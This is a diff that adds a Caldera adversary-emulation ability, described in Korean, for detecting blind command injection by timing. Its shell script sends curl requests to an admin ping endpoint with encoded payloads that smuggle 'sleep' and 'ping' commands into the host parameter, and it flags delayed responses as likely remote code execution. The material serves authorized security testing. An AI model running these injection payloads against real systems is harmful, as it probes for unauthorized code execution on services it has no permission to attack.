@@ -1,0 +1,67 @@
+- id: f2b3c4d5-e6f7-a8b9-c0d1-e2f3a4b5c6d7
+  name: Blind Command Injection - Time-Based Detection
+  description: 명령 실행 결과가 응답에 포함되지 않는 블라인드 환경에서 sleep 또는 ping 지연을 이용해 RCE 여부를 확인합니다. 응답 시간이 삽입한 지연값과 일치하면 명령이 실행된 것으로 판정합니다.
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Unix Shell'
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1059.004"
+          ABILITY_ID="f2b3c4d5-e6f7-a8b9-c0d1-e2f3a4b5c6d7"
+          TARGET="http://#{target.url}"
+
+          echo "[*] Blind CMDi — baseline response time"
+          BASELINE_START=$(date +%s%N)
+          curl -s -o /dev/null \
+            -H "X-Caldera-Op-Id: ${OP_ID}" \
+            -H "X-Caldera-Technique: ${TECH_ID}" \
+            -H "X-Caldera-Ability: ${ABILITY_ID}" \
+            -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+            "${TARGET}/api/admin/ping?host=127.0.0.1"
+          BASELINE_END=$(date +%s%N)
+          BASELINE_MS=$(( (BASELINE_END - BASELINE_START) / 1000000 ))
+          echo "[+] Baseline: ${BASELINE_MS}ms"
+
+          BLIND_PAYLOADS=(
+            # 1. sleep 3
+            "127.0.0.1%3B+sleep+3"
+            # 2. sleep via $()
+            "127.0.0.1+%24%28sleep+3%29"
+            # 3. ping delay (3 ICMP packets = ~3s)
+            "127.0.0.1%3B+ping+-c+3+127.0.0.1"
+            # 4. Conditional sleep: || sleep 3
+            "invalid-host+%7C%7C+sleep+3"
+          )
+
+          LABELS=(
+            "Semicolon + sleep 3"
+            "Dollar-paren sleep: \$(sleep 3)"
+            "Ping delay: ping -c 3"
+            "OR chain: || sleep 3 (error trigger)"
+          )
+
+          for i in "${!BLIND_PAYLOADS[@]}"; do
+            echo ""
+            echo "[*] Blind CMDi $((i+1)): ${LABELS[$i]}"
+            START=$(date +%s%N)
+            curl -s -o /dev/null --max-time 10 \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/admin/ping?host=${BLIND_PAYLOADS[$i]}"
+            END=$(date +%s%N)
+            ELAPSED_MS=$(( (END - START) / 1000000 ))
+            echo "[+] Response time: ${ELAPSED_MS}ms (baseline: ${BASELINE_MS}ms)"
+
+            if [ ${ELAPSED_MS} -gt 2500 ]; then
+              echo "[!] BLIND RCE LIKELY — response delayed by $((ELAPSED_MS - BASELINE_MS))ms"
+            fi
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.rce.blind
